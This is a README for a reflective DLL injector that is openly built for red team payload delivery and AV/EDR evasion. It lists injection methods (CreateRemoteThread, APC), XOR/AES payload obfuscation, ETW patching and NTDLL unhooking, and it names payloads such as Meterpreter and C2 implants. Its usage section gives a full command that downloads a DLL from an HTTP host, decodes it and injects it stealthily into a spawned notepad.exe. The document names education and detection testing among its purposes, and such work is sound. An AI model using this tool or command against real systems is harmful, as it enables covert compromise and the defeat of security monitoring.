# Reflective DLL Injector
[where CMakeList is]
```bash 
mkdir build
cd build
cmake .. -G "Visual Studio 17 2022" 
cmake --build .
```
This project is a modular, stealth-aware reflective DLL injector designed for:

- Red team payload delivery
- Testing AV/EDR behavioral detection
- Simulating fileless malware techniques
- Educational exploration of process injection

It supports:
- Reflective DLL injection (RDI)
- Fileless payload delivery (via URI or embedded)
- Multiple execution vectors (`CreateRemoteThread`, APC)
- Basic XOR or AES-CBC encryption
- ETW patching and NTDLL unhooking for stealth

---

## Payload Types & Creation

a payload must be a Reflective DLL, but that DLL can contain or bootstrap virtually anything:

| Payload Type	             | Description
|----------------------------|-------------------------------------------------|
| Custom Reflective DLL	     | Your own logic: MessageBox, beaconing, hooks, etc.
| Meterpreter-style DLL	     | Shell payloads from Metasploit, Empire, etc.
| Shellcode runner DLL	     | Reflective loader + embedded shellcode
| Donut-based loader	     | Reflective DLL that loads .NET, EXE, or PE shellcode
| C2 implant	             | Full-featured agent (Sliver, Havoc, etc.)
| Diagnostic tool	         | Debuggable test DLL (e.g., create file, log PID, UI popup)

This injector supports raw DLL binaries that export a special function called `ReflectiveLoader`.

### Supported Payloads

| Format                     | Description                                     |
|----------------------------|-------------------------------------------------|
| Raw DLL                    | Traditional PE-formatted DLL file              |
| XOR-encoded DLL            | Same DLL but XOR-obfuscated with a key         |
| AES-encrypted DLL          | DLL encrypted with AES-128-CBC                 |
| Embedded DLL               | DLL compiled directly into the injector source |
| Remote DLL (via URI)       | Payload hosted on HTTP server and loaded at runtime |

---

### How to Make a Reflective DLL

Reflective DLLs are standard DLLs that include a custom loader. You can:

#### Option 1: Use a Known Framework

- [Stephen Fewer’s ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection)
- [TrustedSec's Unicorn](https://github.com/trustedsec/unicorn)
- [Donut (shellcode generator)](https://github.com/TheWover/donut)

#### Minimal Requirements:

1. Export a function called `ReflectiveLoader`
2. Implement logic inside that loader to:
   - Resolve `kernel32.dll` imports manually
   - Call `DllMain` with `DLL_PROCESS_ATTACH`
   - Be position-independent (optional but preferred)

# Usage Syntax

DLLInjector.exe [options]
Payload Source
Flag	Description
--embed	Use DLL embedded in embedded.cpp
--uri <url>	Download DLL from HTTP server

Payload Decoding
Flag	Description
--xor <key>	XOR-decode payload with given string key
--aes <key>	AES-128-CBC decrypt with given key
--iv <iv>	Initialization Vector for AES (16 bytes)

Process Targeting
Flag	Description
--target <name>	Inject into a running process (e.g. notepad.exe)
--spawn <path>	Launch process in suspended mode for stealth injection

Execution Methods
Flag	Description
--exec crt	Use CreateRemoteThread
--exec apc	Use QueueUserAPC injection

Evasion Features
Flag	Description
--unhook	Restore clean syscalls (NTDLL unhooking)
--patch-etw	Patch EtwEventWrite/related functions

Examples
🔹 Embedded DLL into running notepad.exe

Download + XOR-decode and APC inject:
```bash
DLLInjector.exe ^
  --uri http://192.168.1.100/payload.dll ^
  --xor mykey ^
  --spawn "C:\\Windows\\System32\\notepad.exe" ^
  --exec apc ^
  --unhook --patch-etw
```
